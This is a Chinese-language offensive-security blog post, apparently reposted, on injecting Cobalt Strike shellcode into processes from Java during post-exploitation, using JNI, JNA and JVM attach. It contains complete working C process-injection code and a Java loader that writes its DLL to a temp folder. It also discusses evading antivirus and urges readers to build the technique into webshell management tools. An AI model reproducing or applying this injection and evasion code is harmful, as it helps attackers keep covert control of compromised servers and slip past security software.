在后渗透中常常需要cobaltstrike工具。而向已攻破的服务器注入一段cobaltStrike的shellcode是最便捷的上线方法。偏偏java这种语言屏蔽了很多操作系统的底层细节，注入shellcode又是偏底层的方法。

分享一下java注入shellcode的几种方法

1. JNI
------

java是不可以调用使用c/c++的函数，为了兼容以及其他方面的考虑，JVM可以通过JNI去调用c等函数。

我们需要写一个c文件，按照JNI规范写好函数。函数从java中接收参数，并交给dll去处理。

同样，还是一样的套路，调用openProcess打开目标进程，写入内存，创建远程线程去执行shellcode，在java中也不例外。

cobaltStrike官网上的例子

```php
/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject(LPCVOID buffer, int length) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hProcess   = NULL;
    SIZE_T wrote;
    LPVOID ptr;
    char lbuffer[1024];
    char cmdbuff[1024];

    /* reset some stuff */
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    /* start a process */
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = NULL;
    si.hStdError = NULL;
    si.hStdInput = NULL;

    /* resolve windir? */
    GetEnvironmentVariableA("windir", lbuffer, 1024);

    /* setup our path... choose wisely for 32bit and 64bit platforms */
    #ifdef _IS64_
        _snprintf(cmdbuff, 1024, "%s\\SysWOW64\\notepad.exe", lbuffer);
    #else
        _snprintf(cmdbuff, 1024, "%s\\System32\\notepad.exe", lbuffer);
    #endif

    /* spawn the process, baby! */
    if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
        return;

    hProcess = pi.hProcess;
    if( !hProcess )
        return;

    /* allocate memory in our process */
    ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    /* write our shellcode to the process */
    WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&wrote);
    if (wrote != length)
        return;

    /* create a thread in the process */
    CreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);
}
```

c文件写好了，只需要再写一个java文件，加载这个编译好的dll就可以植入shellcode

```php
import java.io.*;

public class Demo {
    /* our shellcode... populate this from Metasploit */
    byte shell[] = new byte[0];

    public native void inject(byte[] me);

    public void loadLibrary() {
        try {
            /* our file */
            String file = "injector.dll";

            /* determine the proper shellcode injection DLL to use */
            if ((System.getProperty("os.arch") + "").contains("64"))
                file = "injector64.dll";

            /* grab our DLL file from this JAR file */
            InputStream i = this.getClass().getClassLoader().getResourceAsStream(file);
            byte[] data = new byte[1024 * 512];
            int length = i.read(data);
            i.close();

            /* write our DLL file to disk, in a temp folder */
            File library = File.createTempFile("injector", ".dll");
            library.deleteOnExit();

            FileOutputStream output = new FileOutputStream(library, false);
            output.write(data, 0, length);
            output.close();

            /* load our DLL into this Java */
            System.load(library.getAbsolutePath());
        }
        catch (Throwable ex) {
            ex.printStackTrace();
        }
    }

    public Demo() {
        loadLibrary();
        inject(shell);
    }

    public static void main(String args[]) {
        new Demo();
    }
}
```

这种方式的缺点：

1. 需要落地一个我们自己写的dll文件
2. 我们自己的dll文件没有签名，很容易被杀软查杀

2. JNA
------

既然java与操作系统交互需要使用JNI这么复杂的技术，那么可不可以不用JNI？答案是可以的，JNA技术是由第三方开发。并不是我们不需要JNI技术，而是JNA将复杂的技术细节统统隐藏。一句话概括，JNA不需要我们再写一个c文件，而是直接调用dll。相比较而言，这已经是加载shellcode最好的解决方案。很多APT组织都使用该技术加载shellcode。

通过JNA，调用dll中的方法就像调用java方法一样简单方便。注入shellcode的代码如下（截图某apt组织

![图片](https://shs3.b.qianxin.com/butian_public/fb1bb9f5c8f44cf15cbc71887e68e1263.jpg)

CoffeeShot allocates memory in the target process using VirtualAllocEx

当然，这种其实还是有缺点：

1. JNA所需要的jar包，jdk并不提供，需要我们自己集成，这样的话，我们payload会非常大（1M多
2. jna为了实现调用dll文件，也会生成一个jni的dll文件。而这个dll文件并没有签名，所以遇到杀软一样被查

3. JVM
------

昨天的文章中，我分析了JAVA是如何向其他JVM注入agent包以修改class字节码。我们也可以调用来注入我们自己的shellcode。

[冰蝎beta8内存马防查杀破解](http://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247484620&idx=1&sn=cdadffdeac2a021edc1ee49f22880f08&chksm=fa8b1954cdfc904266a2948b26b0daceb908cc1f037ea874f3d6bc59b9706fbfbacde3d560f8&scene=21#wechat_redirect)

该方法虽然同样使用JNI，但是所需的dll文件由JDK提供，安全稳定，且经过oracle签名。

![图片](https://shs3.b.qianxin.com/butian_public/fef97a752bd4960a0331db0cfbe46d285.jpg)

首先我们判断一下JVM中是否已经加载`sun.tools.attach.WindowsVirtualMachine`这个类，如果没有的话，通过java asm去组装一个类。通过java asm组装的类的代码如下![图片](https://shs3.b.qianxin.com/butian_public/f97ab502f8f39576f859a05783cbf0690.jpg)

然后通过反射调用即可![图片](https://shs3.b.qianxin.com/butian_public/f9834d800473f62cf37f7519cd0086009.jpg)

我认为这种方法比较优雅，不用落地dll文件，利用的dll文件经过数字签名，payload的体积比较小。比较适合冰蝎这种webshell工具集成进来。

java demo已经上传知识星球。多转发多点赞，把这个功能集成到webshell管理工具中

**文章转载于”宽字节安全”公众号，已取得转载授权。**